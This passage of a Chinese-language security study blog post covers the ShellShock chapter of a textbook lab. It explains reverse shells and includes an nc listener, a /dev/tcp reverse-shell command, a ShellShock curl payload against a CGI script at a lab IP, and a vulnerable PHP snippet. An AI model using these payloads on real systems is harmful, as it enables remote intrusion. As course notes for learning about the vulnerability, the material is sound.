+<li>应该是权限不够，虽然apache根进程是root权限（因为使用80和443端口），但是apache大部分进程还是Ubuntu运行Web服务的默认用户www-data，权限很低</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092030467.png" alt="image-20231009203013438"></p>
+<h2 id="5、反弹shell："><a href="#5、反弹shell：" class="headerlink" title="5、反弹shell："></a>5、反弹shell：</h2><ul>
+<li>反向shell：<ul>
+<li>让shell程序的输入和输出都交由远程计算机用户控制</li>
+<li>关键在于让shell的标准输入和输出都重定向到一个网络连接</li>
+</ul>
+</li>
+<li>net cat（nc）:<ul>
+<li>运行一个TCP服务器，能将客户端的输入打印出来，并将本地输入，发送给客户端</li>
+</ul>
+</li>
+<li>攻击者：nc -lvnp 9090，启动服务器，并监听9090端口，教材的-lv报错</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092041931.png" alt="image-20231009204151901"></p>
+<ul>
+<li>反弹shell指令：&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1<ul>
+<li>&#x2F;bin&#x2F;bash -i ，交互模式下启动bash，此时会提供提示符</li>
+<li>&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;9090，表示前面的bash程序的<strong>标准输出1</strong>被重定向到TCP网络连接，会<strong>将shell的输出发送到TCP连接</strong>。</li>
+<li>0&lt;&amp;1，标准输入0重定向到标准输出1，即输出也被用作输入，输出已被重定向到TCP连接，所以会<strong>从TCP连接中获得输入</strong>。</li>
+<li>2&gt;&amp;1，将标准错误输出2重定向到标准输出1。1已经重定向到TCP连接，故将<strong>shell错误信息发送到TCP连接</strong></li>
+</ul>
+</li>
+<li>攻击者利用shellshock执行反弹shell：curl -A “() { echo hello;};echo Cotent-type:text&#x2F;plain;echo;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1” <a target="_blank" rel="noopener" href="http://10.0.2.4/cgi-bin/normal.cgi">http://10.0.2.4/cgi-bin/normal.cgi</a></li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092058469.png" alt="image-20231009205813443"></p>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092057303.png" alt="image-20231009205757269"></p>
+<ul>
+<li><strong>0&lt;&amp;1</strong>：<ul>
+<li>这个重定向操作表示将标准输入（文件描述符0）重定向到标准输出（文件描述符1）。换句话说，它将进程的输入流与输出流连接起来，使得从标准输入读取的内容实际上是从标准输出中获取的内容。</li>
+</ul>
+</li>
+<li><strong>1&gt;&amp;0</strong>：<ul>
+<li>这个重定向操作表示将标准输出（文件描述符1）重定向到标准输入（文件描述符0）。它将进程的输出流与输入流连接起来，使得进程输出的内容实际上成为进程的输入。这通常用于将一个命令的输出传递给另一个命令作为输入。</li>
+</ul>
+</li>
+</ul>
+<h2 id="6、针对PHP的远程攻击："><a href="#6、针对PHP的远程攻击：" class="headerlink" title="6、针对PHP的远程攻击："></a>6、针对PHP的远程攻击：</h2><ul>
+<li><p>触发bash：PHP中的system函数与c的类似，都使用&#x2F;bin&#x2F;sh执行命令</p>
+</li>
+<li><p>用户控制环境变量：</p>
+<ul>
+<li>以CGI程序运行，此时的情况与shell程序类似</li>
+<li>根据用户输入设置了环境变量，然后再用system调用外部程序</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getParam</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$arg</span> =<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg&quot;</span>])&amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg&quot;</span>])) &#123;</span><br><span class="line">		<span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&quot;arg&quot;</span>]; &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$arg</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$arg</span>=<span class="title function_ invoke__">getParam</span>();</span><br><span class="line">	<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;ARG=<span class="subst">$arg</span>&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;strings /proc/$$/environ | grep ARG&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092100751.png" alt="image-20231009210050680"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/">http://example.com/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">软件安全测试</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/17/03_ShellShockAttack/" title="03_Lab02《计算机安全导论：深度实践》ShellShock实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">03_Lab02《计算机安全导论：深度实践》ShellShock实验</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/10/17/01-Set-UID%E7%89%B9%E6%9D%83%E7%A8%8B%E5%BA%8F/" title="《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记</div></div></a></div><div><a href="/2023/10/17/02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="02_《计算机安全导论：深度实践》第二章环境变量"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">02_《计算机安全导论：深度实践》第二章环境变量</div></div></a></div><div><a href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验</div></div></a></div><div><a href="/2023/10/17/03_ShellShockAttack/" title="03_Lab02《计算机安全导论：深度实践》ShellShock实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">03_Lab02《计算机安全导论：深度实践》ShellShock实验</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86%EF%BC%9Ashell%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">一、背景知识：shell函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81shell%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A%E5%99%A8%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1、shell命令解释器：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81shell%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">2、shell函数：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ShellShock%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、ShellShock漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">1、漏洞描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81bash%E7%9A%84%E6%BA%90%E7%A0%81%E9%94%99%E8%AF%AF%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2、bash的源码错误：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81shellshock%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">3、shellshock漏洞利用：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BBSet-UID%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、攻击Set-UID程序：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BBCGI%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">四、攻击CGI程序：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81CGI%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">1、CGI程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">2、实验环境测试：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%B0%83%E7%94%A8CGI%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text">3、调用CGI程序流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E5%AE%9E%E6%96%BDshellshock%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-number">4.4.</span> <span class="toc-text">4、实施shellshock攻击：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%8F%8D%E5%BC%B9shell%EF%BC%9A"><span class="toc-number">4.5.</span> <span class="toc-text">5、反弹shell：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E9%92%88%E5%AF%B9PHP%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-number">4.6.</span> <span class="toc-text">6、针对PHP的远程攻击：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/03_ShellShockAttack/" title="03_Lab02《计算机安全导论：深度实践》ShellShock实验">03_Lab02《计算机安全导论：深度实践》ShellShock实验</a><time datetime="2023-10-17T09:10:55.000Z" title="Created 2023-10-17 17:10:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="03_《计算机安全导论：深度实践》第三章ShellShock">03_《计算机安全导论：深度实践》第三章ShellShock</a><time datetime="2023-10-17T09:08:55.000Z" title="Created 2023-10-17 17:08:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验">02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验</a><time datetime="2023-10-17T09:06:55.000Z" title="Created 2023-10-17 17:06:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="02_《计算机安全导论：深度实践》第二章环境变量">02_《计算机安全导论：深度实践》第二章环境变量</a><time datetime="2023-10-17T08:59:30.000Z" title="Created 2023-10-17 16:59:30">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/01-Set-UID%E7%89%B9%E6%9D%83%E7%A8%8B%E5%BA%8F/" title="《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记">《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记</a><time datetime="2023-10-17T08:47:55.000Z" title="Created 2023-10-17 16:47:55">2023-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
